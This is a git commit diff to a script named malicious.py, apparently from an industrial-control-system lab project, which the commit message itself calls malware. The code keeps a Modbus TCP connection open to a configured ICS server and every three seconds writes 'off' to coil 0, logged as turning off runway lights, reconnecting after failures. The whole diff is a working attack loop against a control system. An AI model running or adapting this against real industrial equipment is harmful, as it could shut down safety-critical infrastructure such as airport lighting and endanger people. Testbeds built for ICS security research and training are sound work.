55b1a2d824c1ce52ce2caace3d38045ef47c4420
DanAun <23170040+DanAun@users.noreply.github.com>
2025-07-17 14:54:37 +0200

    fix: malware to keep socket connection for process

--- malicious/malicious.py
+++ malicious/malicious.py
@@ -12,33 +12,30 @@ from pymodbus.client import ModbusTcpClient
 import time
 from ics.constants import ICS_SERVER_PORT, ICS_SERVER_IP
 
-REQUEST_FREQUENCY = 10  # Frequency of requests in seconds
+REQUEST_FREQUENCY = 3  # Frequency of requests in seconds
 RETRY_DELAY = 10  # Delay in seconds before retrying connection
 
-def loop_modbus_request():
-    # Create a Modbus TCP client
-    client = ModbusTcpClient(ICS_SERVER_IP, port=ICS_SERVER_PORT)
-    
+def loop_modbus_request(client):
     while True:
         try:
-            # Connect to the server
-            client.connect()
-            
             # Write 0 (OFF) to coil at address 0
-            log.info("Sending turn off signal to ics runway lights")
+            log.debug("Sending turn off signal to ics runway lights")
             client.write_coil(0, False)
-        
         except pymodbus.exceptions.ConnectionException as e:
             # pymodbus already logs connection errors
             time.sleep(RETRY_DELAY)
-        finally:
-            client.close()
-
+            client.connect()
         # Small delay to prevent overwhelming the server
         time.sleep(REQUEST_FREQUENCY)
 
 if __name__ == "__main__":
     try:
-        loop_modbus_request()
+        log.info("Running malware...")
+        # Create a Modbus TCP client
+        client = ModbusTcpClient(ICS_SERVER_IP, port=ICS_SERVER_PORT) 
+        client.connect()
+        loop_modbus_request(client)
     except KeyboardInterrupt:
         log.info("Script stopped by user")
+    finally:
+        client.close()
